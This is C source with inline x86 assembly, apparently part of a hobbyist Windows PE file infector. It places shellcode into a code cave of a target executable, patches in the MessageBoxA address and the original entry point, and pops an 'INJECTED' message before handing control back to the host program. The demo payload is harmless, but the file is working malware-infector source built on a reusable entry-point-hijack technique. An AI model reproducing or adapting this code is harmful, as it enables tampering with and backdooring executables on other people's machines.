#include <Windows.h>
#include "exe.h"

#pragma warning(disable : 4996)

#define NOP_COUNT 30

__declspec(naked) shellcode(VOID) {
    __asm {
        call    routine

        routine :
        pop     ebp
            sub     ebp, offset routine
            push    0                                // MB_OK
            lea     eax, [ebp + szCaption]
            push    eax                              // lpCaption
            lea     eax, [ebp + szText]
            push    eax                              // lpText
            push    0                                // hWnd
            mov     eax, 0xAAAAAAAA                  // move eax messagebox address
            call    eax                              // MessageBoxA

            popad
            popad
            push    0xBBBBBBBB
            ret
            //mov     eax, 0xBBBBBBBB                 // move eax relative jump offset
            //jmp before_call

            //set_correct_relative_jmp:
            //pop ebx //ebx got eip after call
            //add ebx, before_call
            //sub ebx, after_call

            //jmp_to_original_entery_point:
            //push eax
            //ret// MessageBoxA
            //
            //before_call:
            //call set_correct_relative_jmp
            //after_call:

            szCaption :
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            szText :
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
    }
}

LPVOID set_addrress_in_shellcode(EXE_file* infected, LPBYTE codecave_address, DWORD shellcode_size)
{

    // dynamically obtain address of function
    HMODULE hModule = LoadLibrary(L"User32.dll");
    PIMAGE_DATA_DIRECTORY relocation_directory = { 0 };

    LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");
    DWORD relative_jump = 0;
    DWORD offset = 0;
    long* current_call_address = 0;
    PVOID reloction_end = NULL;
    do
    {
        current_call_address = (PCHAR)codecave_address + offset;
        if (*current_call_address == 0xAAAAAAAA) {
            // insert function's address
            *current_call_address = (DWORD)lpAddress;
            FreeLibrary(hModule);
            break;
        }
        offset++;
    } while (offset < shellcode_size);

    do
    {
        // modify OEP address offset
        current_call_address = (PCHAR)codecave_address + offset;
        if (*current_call_address == 0xBBBBBBBB) {
            // insert address of entry point
            *current_call_address = infected->entery_address;


            break;
        }
        offset++;
    } while (offset < shellcode_size);

    strcpy((char*)codecave_address + shellcode_size - NOP_COUNT, "INJECTED");
    strcpy((char*)codecave_address + shellcode_size - 20, "I 10ve ass3mb!y");

    return NULL;
}

DWORD get_shellcode_size()
{
    int counter = 0;
    //random offset to fix bug.
    char* func_pointer = (char*)shellcode + 0x1070;
    unsigned char current_char = 0;
    do
    {
        current_char = *(func_pointer + counter);
        counter++;

    } while (current_char != 0x90);
    //10 nop at the end of shellcode.
    return counter + NOP_COUNT;
}